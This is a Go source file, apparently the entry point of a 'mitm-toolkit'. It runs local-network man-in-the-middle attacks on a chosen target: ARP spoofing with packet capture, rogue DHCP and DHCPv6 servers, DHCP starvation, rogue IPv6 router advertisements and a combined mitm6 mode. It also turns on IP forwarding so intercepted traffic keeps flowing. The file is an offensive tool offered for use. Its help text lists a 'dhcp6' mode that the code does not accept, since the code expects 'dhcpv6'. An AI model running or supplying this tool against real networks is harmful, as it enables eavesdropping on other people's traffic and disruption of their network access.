package main

import (
	"flag"
	"fmt"
	"mitm-toolkit/arp"
	"mitm-toolkit/capture"
	"mitm-toolkit/dhcp"
	"mitm-toolkit/dhcp6"
	"mitm-toolkit/network"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"syscall"
)

func main() {

	// mode
	var mode string

	// Capturing the ip address from the command line
	var targetIP string

	// offered ip
	var offeredIP string

	// count
	var count int

	flag.StringVar(&mode, "mode", "", "attack mode: arp, dhcp, dhcp-starve, dhcp6, ra, mitm6 (required)")
	flag.StringVar(&targetIP, "t", "", "target ip address (required for arp)")
	flag.StringVar(&offeredIP, "offer", "", "IP to offer target (required for dhcp)")
	flag.IntVar(&count, "count", 0, "how many DHCP Discover to send (required for dhcpv4)")
	flag.Parse()

	if mode == "" {
		fmt.Println("Error: Mode is required")
		fmt.Println("Usage: mode <arp | dhcp>")
		os.Exit(1)
	}

	// Get local network information
	localNetwork, err := network.GetLocalNetworkInfo()
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		os.Exit(1)
	}

	switch mode {
	case "arp":
		// Validate that ip address was provided
		if targetIP == "" {
			fmt.Println("Error: target IP address is required")
			fmt.Println("Usage: -t <target_ip_address>")
			os.Exit(1)
		}

		// Check if target is reachable
		// send 2 pings and each one with timeout of 2 seconds to the target
		fmt.Printf("Checking if %v is reachable...\n", targetIP)
		cmd := exec.Command("ping", "-c", "2", "-W", "2", targetIP)

		if err := cmd.Run(); err != nil {
			fmt.Printf("Error: Target %s is not reachable or offline\n", targetIP)
			os.Exit(1)
		}

		fmt.Println("Target is reachable!")

		fmt.Printf("Target IP address: %v\n", targetIP)

		printAttackerInfo(localNetwork)

		// Get gateway information
		gatewayIP, err := network.GetNetworkGateway()
		if err != nil {
			fmt.Printf("Error: %v\n", err)
			os.Exit(1)
		}

		fmt.Printf("\nGateway Information:\n")
		fmt.Printf("  Gateway IP: %s\n", gatewayIP)

		// Get target MAC address via ARP
		targetMAC, err := network.GetMACFromIP(targetIP, localNetwork)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("\nTarget MAC Address: %s\n", targetMAC)

		// Get gateway MAC address via ARP
		gatewayMAC, err := network.GetMACFromIP(gatewayIP, localNetwork)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("Gateway MAC Address: %s\n", gatewayMAC)

		if err := arp.EnableIPForwarding(); err != nil {
			fmt.Printf("Error: %v\n", err)
			os.Exit(1)
		}

		fmt.Println("\nStarting ARP spoofing attack...")
		fmt.Println("Press Ctrl+C to stop and restore ARP tables.")
		fmt.Println() // Empty line before traffic output

		go arp.StartARPSpoofing(localNetwork, targetIP, targetMAC, gatewayIP, gatewayMAC)
		go capture.StartCapture(localNetwork, targetIP)

		// Block until ctrl+c signal to exit
		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		<-sigChan

		//Cleanup
		fmt.Println("\nRestoring ARP tables...")
		arp.RestoreARP(localNetwork, targetIP, targetMAC, gatewayIP, gatewayMAC)

	case "dhcp":

		// validate offer
		if offeredIP == "" {
			fmt.Println("Error: offered ip is required")
			fmt.Println("Usage: offer <ip_address>")
			os.Exit(1)
		}

		printAttackerInfo(localNetwork)

		// enable IP forwarding
		if err := arp.EnableIPForwarding(); err != nil {
			fmt.Printf("Error: %v\n", err)
			os.Exit(1)
		}

		fmt.Println("\nStarting DHCP Rogue attack...")
		fmt.Println("Press Ctrl+C to stop.")
		fmt.Println()

		go dhcp.ListenDHCP(localNetwork, net.ParseIP(offeredIP))
		go capture.StartCapture(localNetwork, offeredIP)

		// Block until ctrl+c signal to exit
		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		<-sigChan

	case "dhcp-starve":

		if count <= 0 {
			fmt.Println("Error: count is required and must be greater than 0")
			fmt.Println("Usage: -count <number>")
			os.Exit(1)
		}

		printAttackerInfo(localNetwork)

		fmt.Println("Starting DHCP starvation attack")
		fmt.Println()

		dhcp.StartStarvation(localNetwork, count)

		fmt.Printf("\nDone! Sent %v DHCP Discover packets\n", count)

	case "dhcpv6":

		if offeredIP == "" {
			fmt.Println("Error: offered ip is required")
			os.Exit(1)
		}

		printAttackerInfo(localNetwork)
		fmt.Println("\nStarting DHCPv6 Rogue attack...")

		go dhcp6.ListenDHCPv6(localNetwork.InterfaceName, localNetwork.MacAddress, net.ParseIP(offeredIP))

		sigCha := make(chan os.Signal, 1)
		signal.Notify(sigCha, syscall.SIGINT, syscall.SIGTERM)
		<-sigCha

	case "ra":
		printAttackerInfo(localNetwork)

		if err := arp.EnableIPv6Forwarding(); err != nil {
			fmt.Printf("Error: %v\n", err)
			os.Exit(1)
		}

		fmt.Println("\nStarting Rogue RA attack...")
		fmt.Println("Press Ctrl+C to stop.")

		go dhcp6.SendRouterAdvertisement(localNetwork.InterfaceName, localNetwork.IPv6Address)

		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		<-sigChan

	case "mitm6":
		if offeredIP == "" {
			fmt.Println("Error: offered ip is required")
			os.Exit(1)
		}

		printAttackerInfo(localNetwork)

		if err := arp.EnableIPv6Forwarding(); err != nil {
			fmt.Printf("Error: %v\n", err)
			os.Exit(1)
		}

		fmt.Println("\nStarting MITM6 attack (DHCPv6 + Rogue RA)...")
		fmt.Println("Press Ctrl+C to stop.")
		fmt.Println()

		go dhcp6.ListenDHCPv6(localNetwork.InterfaceName, localNetwork.MacAddress, net.ParseIP(offeredIP))
		go dhcp6.SendRouterAdvertisement(localNetwork.InterfaceName, localNetwork.IPv6Address)

		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		<-sigChan

	default:
		fmt.Println("Invalid mode")
		os.Exit(1)

	}

}

// small helper to print attacker info
func printAttackerInfo(localNetwork network.NetworkInterface) {
	fmt.Printf("\nAttacker Information:\n")
	fmt.Printf("  Interface: %s\n", localNetwork.InterfaceName)
	fmt.Printf("  IP Address: %s\n", localNetwork.IPv4Address)
	fmt.Printf("  MAC Address: %s\n", localNetwork.MacAddress)
	fmt.Printf("  IPv6 Address: %s\n", localNetwork.IPv6Address)
}
